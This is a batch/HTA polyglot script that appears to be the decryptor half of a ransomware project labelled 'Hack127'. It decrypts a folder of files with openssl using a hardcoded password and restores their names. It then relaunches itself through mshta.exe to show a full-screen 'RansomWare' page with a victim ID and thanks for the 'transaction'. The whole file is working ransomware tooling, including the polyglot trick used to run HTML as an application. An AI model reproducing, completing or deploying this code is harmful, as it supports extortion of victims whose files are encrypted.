<!-- Batch Section
@echo off
setlocal enabledelayedexpansion

REM @2023-CEVIK Meryem

REM Dossier source
set "source_folder=C:\Users\vboxuser\Desktop\encrypted"

REM Dossier destination
set "decrypted_folder=C:\Users\vboxuser\Desktop\decrypted"

REM Mot de passe pour le décryptage
set "mot_de_passe=HACK127_fOB0?a4?644x4aeR"

REM Création du dossier decrypted (sil nexiste pas)
if not exist "%decrypted_folder%" mkdir "%decrypted_folder%"

REM Décryptage des fichiers
for %%f in ("%source_folder%\*.*") do (
    openssl enc -d -aes-256-cbc -salt -pass "pass:%mot_de_passe%" -in "%%f" -out "%decrypted_folder%\%%~nxf"
)

REM Suppression de l'extension .enc des fichiers décryptés
ren "%decrypted_folder%\*.enc" *.

REM Fin du script
endlocal

REM Block Screen
cls
setlocal
for /F "delims=" %%a in ('mshta.exe "%~F0"') do set "HTA=%%a"

--><html>
    <head>
        <title>Hack127</title>
    <hta:application id="oBVC" 
                     applicationname="BSOD"  
                     version="1.0" 
                     maximizebutton="yes" 
                     minimizebutton="yes" 
                     sysmenu="yes" 
                     Caption="yes" 
                     windowstate="maximize"/> 
    <style>
    body {
            background-color: green;
            font-family: Arial, sans-serif;
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
        }
        #texto2{
            padding-top: 19%;
            letter-spacing: 1px;
            text-align: center;
        }
    </style>
</head>

<body bgcolor="green" scroll="no">
    <font face="Lucida Console" size="4" color="white">
<center><p> - RansomWare - </p></center>
<div id="texto2">
    Hack127 - ID : 6768 <br><br>
    <br><br>
    Your files have been safely decrypted in the "decrypted" folder.
    <br><br><br><br>
    Thank you for your transaction !<br><br>
    <br><br><br>
    <img id="imagen" alt="Candado" src="https://i.imgur.com/JoiwuWi.png" height="130" width="100">
</div>
</body>
</html>
